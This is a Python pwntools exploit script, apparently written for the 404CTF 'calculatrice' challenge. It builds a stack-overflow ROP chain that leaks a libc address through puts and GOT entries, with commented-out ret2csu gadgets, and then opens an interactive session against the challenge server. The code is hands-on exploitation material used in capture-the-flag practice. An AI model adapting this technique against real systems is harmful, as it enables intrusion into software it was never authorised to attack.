#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('calculatrice')
libc = ELF('libc.so.6')

host = args.HOST or 'challenges.404ctf.fr'
port = int(args.PORT or 32111)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
b *0x4016a1
b *0X0040184a
b *0x4016df
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

OFFSET = 0xd
exe.sym['main'] = 0x4016df

rop = ROP(exe)

## ret2csu
GADGET_1 = 0X0040184a
GADGET_2 = 0X00401830

print(rop.dump())

p  = f'*'*OFFSET
p += f"{rop.rdi.address}*"
p += f"{exe.got['puts']}*"
p += f"{exe.plt['puts']}*"
#p += f"{GADGET_1}*"
p += f"{rop.rdi.address}*"
p += f"{exe.sym['stdin']}*"
p += f"{exe.sym['strsep']}*"
p += f"{rop.rdi.address}*"
p += f"{exe.bss()}*"
p += f"{rop.rsi.address}*"
p += f"{0X1000}**"
p += f"{exe.plt['fgets']}*"
# p += f"*" # RBX
# p += f"{1}*" # RBP
# p += f"*" # R12 pointeur vers .fini
# p += f"*" # R13
# p += f"{exe.sym['stdin']}*" # R14 futur RDX
# p += f"{0X3fe700}*" # R15 call [r15] dans second gadget
# p += f"{GADGET_2}*"
# p += f"*" # padding
# p += f"*" # rbx
# p += f"*" # rbp
# p += f"*" # r12
# p += f"*" # r13
# p += f"*" # r14
# p += f"*" # r15
# p += f"{rop.rdi.address}*"
# p += f"{exe.bss()}*"
# p += f"{rop.rsi.address}*" # pop rsi, r15
# p += f"{0X1000}*"
# p += f"*" # garbage
# p += f"{rop.ret.address}*" # stack align
# p += f"{exe.plt['fgets']}*"

print(p, hex(len(p)))

assert len(p) <= 0x93, f"Payload too long {len(p):x}"

io.sendlineafter(b'calcul : ', p.encode())

leak = u64(io.recvline().strip().ljust(8,b'\0'))
libc.address = leak - libc.sym['puts']

log.success(f"{leak = :x} {libc.address = :x}")

io.interactive()

